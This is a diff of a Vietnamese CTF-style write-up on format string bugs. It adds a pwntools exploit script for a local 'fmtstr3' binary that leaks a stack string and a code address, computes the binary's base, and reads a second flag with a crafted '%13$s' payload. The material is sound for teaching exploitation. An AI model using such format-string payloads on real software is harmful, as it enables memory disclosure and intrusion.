@@ -67,7 +67,7 @@ Chuỗi flag được lưu ở Stack có thể được truy cập từ % thứ 
 ![Alt text](image/fs2.png)
 ![Alt text](image/fs3.png)
 
-Script Python:
+## Script Python:
 
     #!/usr/bin/env python3
     from pwn import *
@@ -95,7 +95,7 @@ Chương trình này cũng mở sẵn flag nhưng flag lần này được ghi v
 
 Trong Stack chỉ có biến buf chứa địa chỉ đầu vùng nhớ chứa flag vậy nên không thể dùng `%p` (in ra giá trị) mà cần dùng `%s` (in ra giá trị nằm trong địa chỉ được trỏ tới).
 
-Script Python:
+## Script Python:
 
 	#!/usr/bin/env python3
 	from pwn import *
@@ -158,3 +158,39 @@ lần nhập buffer thứ 2: cần dùng 8 BYTE đầu để nhập format để
 
 
 ![Alt text](image/fs12.png)
+
+## Script Python:
+
+	#!/usr/bin/env python3
+	from pwn import *
+	exe=ELF('./fmtstr3',checksec=False)
+	p=process(exe.path)
+	
+	gdb.attach(p,gdbscript='''
+		b*run+364
+		b*run+434
+		c
+		'''
+	)
+	
+	input()
+	
+	p.sendlineafter(b'Your name: ',b'%8$s%17$p')
+	
+	p.recvuntil(b'Hello ')
+	flag=b''
+	flag=p.recvuntil(b'0x',drop=True)
+	exe_leak=int(p.recvline()[:-1],16)   
+	exe.address=exe_leak-0x14e6
+	flag2_addr=exe.address+0x4060
+	log.info('flag1: '+flag.decode())
+	log.info('exe_leak: '+hex(exe_leak))
+	log.info('exe.address: '+hex(exe.address))
+	log.info('flag2_addr: '+hex(flag2_addr))
+	
+	payload=b'%13$sAAA'
+	payload+=p64(flag2_addr)
+	p.sendlineafter(b'greeting: ',payload)
+	flag+=p.recvuntil(b'}')
+	log.info('flag: '+flag.decode())
+	p.interactive()
